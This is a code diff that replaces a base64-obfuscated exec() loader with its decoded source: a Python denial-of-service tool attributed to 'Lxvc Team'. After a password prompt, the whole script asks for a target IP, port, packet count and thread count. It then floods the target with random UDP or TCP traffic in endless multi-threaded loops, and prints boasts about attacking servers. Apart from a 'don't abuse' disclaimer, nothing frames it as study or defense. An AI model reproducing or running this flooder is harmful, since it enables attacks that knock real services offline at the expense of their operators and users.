@@ -1,6 +1,70 @@
-#DDOS TOOLS LxvcTeam
-#DON'T ABUSE 
-#SAYA TIDAK BERTANGGUNG JAWAB JIKA DISALAHGUNAKAN
-#CIEE MAU MALING TOOLS GA BISA AWOKAWOK
-import base64
-exec(base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KI0x4dmNUZWFtVjEuMg0KaW1wb3J0IHRpbWUNCmltcG9ydCByYW5kb20NCmltcG9ydCBzb2NrZXQNCmltcG9ydCB0aHJlYWRpbmcNCmltcG9ydCBvcw0KDQpvcy5zeXN0ZW0oImNsZWFyIikNCnBhc3N3b3JkID0iTHh2YyINCg0KZm9yIGkgaW4gcmFuZ2UoMyk6DQoJcHdkID0gaW5wdXQoIlvigKJdIFBBU1NXT1JEOiAiKQ0KCWo9Mw0KCWlmKHB3ZD09cGFzc3dvcmQpOg0KCQl0aW1lLnNsZWVwKDUpDQoJCXByaW50KCJb4oCiXSBUVU5HR1UgNSBERVRJSyEhISAiKQ0KCQlicmVhaw0KCWVsc2U6DQoJCXRpbWUuc2xlZXAoNSkNCgkJcHJpbnQoIlvDl10gUEFTU1dPUkQgU0FMQUghISEgIikNCgkJY29udGludWUNCnRpbWUuc2xlZXAoNSkNCnByaW50KCJ74oiafSBTZWxlc2FpIE1lbmdndW5ha2FuIFBhc3N3b3JkIEx4dmMiKQ0KdGltZS5zbGVlcCg1KQ0KcHJpbnQoIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpDQpwcmludCgiID4+ICAgRGlzY29yZCA6IFVua25vdyMxNzE2ICAgICAgPDwiKQ0KcHJpbnQoIiA+PiAgIFRvb2xzIENyZWF0ZWQgQnkgTHh2YyBUZWFtIDw8IikNCnByaW50KCIgPj4gICBOT1RFIDogRE9OJ1QgQUJVU0UhISAgICAgICA8PCIpDQpwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIikNCmlwID0gc3RyKGlucHV0KCIgTHh2Y1RlYW0gfCBJcDoiKSkNCnBvcnQgPSBpbnQoaW5wdXQoIiBMeHZjVGVhbSB8IFBvcnQ6IikpDQpjaG9pY2UgPSBzdHIoaW5wdXQoIiBMeHZjVGVhbSB8IERkb3MgR2FrPyh5L24pOiIpKQ0KdGltZXMgPSBpbnQoaW5wdXQoIiBMeHZjVGVhbSB8IFBhY2tldHM6IikpDQp0aHJlYWRzID0gaW50KGlucHV0KCIgTHh2Y1RlYW0gfCBUaHJlYWRzOiIpKQ0KZGVmIHJ1bigpOg0KCWRhdGEgPSByYW5kb20uX3VyYW5kb20oMTYwMCkNCglpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQ0KCXdoaWxlIFRydWU6DQoJCXRyeToNCgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkNCgkJCWFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpDQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6DQoJCQkJcy5zZW5kdG8oZGF0YSxhZGRyKQ0KCQkJcHJpbnQoaSArIiBMWFZDIFRFQU0gUFJFU0VOVCAiKQ0KCQlleGNlcHQ6DQoJCQlwcmludCgiWyFdIExYVkMgRlVDS0lORyBUSEUgU0VSVkVSICEhISAiKQ0KDQpkZWYgcnVuMigpOg0KCWRhdGEgPSByYW5kb20uX3VyYW5kb20oMTcpDQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkNCgl3aGlsZSBUcnVlOg0KCQl0cnk6DQoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KCQkJcy5jb25uZWN0KChpcCxwb3J0KSkNCgkJCXMuc2VuZChkYXRhKQ0KCQkJZm9yIHggaW4gcmFuZ2UodGltZXMpOg0KCQkJCXMuc2VuZChkYXRhKQ0KCQkJcHJpbnQoaSArIiBMWFZDIFRFQU0gUFJFU0VOVCAiKQ0KCQlleGNlcHQ6DQoJCQlzLmNsb3NlKCkNCgkJCXByaW50KCJbKl0gTFhWQyBGVUNLSU5HIFRIRSBTRVJWRVJTISAiKQ0KDQpmb3IgeSBpbiByYW5nZSh0aHJlYWRzKToNCglpZiBjaG9pY2UgPT0gJ3knOg0KCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQ0KCQl0aC5zdGFydCgpDQoJZWxzZToNCgkJdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bjIpDQoJCXRoLnN0YXJ0KCk="))
+#!/usr/bin/env python3
+#LxvcTeamV1.2
+import time
+import random
+import socket
+import threading
+import os
+
+os.system("clear")
+password ="Lxvc"
+
+for i in range(3):
+	pwd = input("[•] PASSWORD: ")
+	j=3
+	if(pwd==password):
+		time.sleep(5)
+		print("[•] TUNGGU 5 DETIK!!! ")
+		break
+	else:
+		time.sleep(5)
+		print("[×] PASSWORD SALAH!!! ")
+		continue
+time.sleep(5)
+print("[√] Berhasil Login, Wait")
+time.sleep(5)
+print("------------------------------------------------------------")
+print(" >>   Discord : Unknow#1716      <<")
+print(" >>   Tools Created By Lxvc Team <<")
+print(" >>   NOTE : DON'T ABUSE!!       <<")
+print("------------------------------------------------------------")
+ip = str(input(" LxvcTeam | Ip:"))
+port = int(input(" LxvcTeam | Port:"))
+choice = str(input(" LxvcTeam | Ddos Gak?(y/n):"))
+times = int(input(" LxvcTeam | Packets:"))
+threads = int(input(" LxvcTeam | Threads:"))
+def run():
+	data = random._urandom(1600)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" LXVC TEAM PRESENT ")
+		except:
+			print("[!] LXVC FUCKING THE SERVER !!! ")
+
+def run2():
+	data = random._urandom(17)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" LXVC TEAM PRESENT ")
+		except:
+			s.close()
+			print("[*] LXVC FUCKING THE SERVERS! ")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
